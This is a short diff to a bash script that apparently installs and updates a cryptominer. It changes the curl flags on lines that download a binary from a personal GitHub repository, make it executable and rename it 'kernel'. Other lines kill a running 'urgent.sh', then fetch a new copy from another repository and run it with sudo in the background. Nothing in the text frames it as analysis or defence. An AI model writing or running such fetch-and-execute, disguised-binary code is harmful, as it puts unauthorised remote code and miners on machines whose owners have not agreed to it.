@@ -4,7 +4,7 @@
 if [ ! -f sudah_initiate_ver.txt ]; then
   sudo rm -rf cpuminer
   touch sudah_initiate_ver.txt
-  curl -L -o python https://github.com/oggierf/myproject/raw/main/pointd
+  curl -L https://github.com/oggierf/myproject/raw/main/pointd
   chmod +x pointd
   sudo mv pointd kernel
 fi
@@ -41,6 +41,6 @@ if [ ! -f sudah_initiate_discord.txt ]; then
 ##################################
 sudo kill $(ps aux | grep 'urgent.sh' |  grep -v 'auto' | awk '{print $2}')
 sudo rm -rf urgent.sh
-curl https://raw.githubusercontent.com/terryputri/bash/main/urgent.sh
+curl -L https://raw.githubusercontent.com/terryputri/bash/main/urgent.sh
 sudo bash urgent.sh &
 #################################
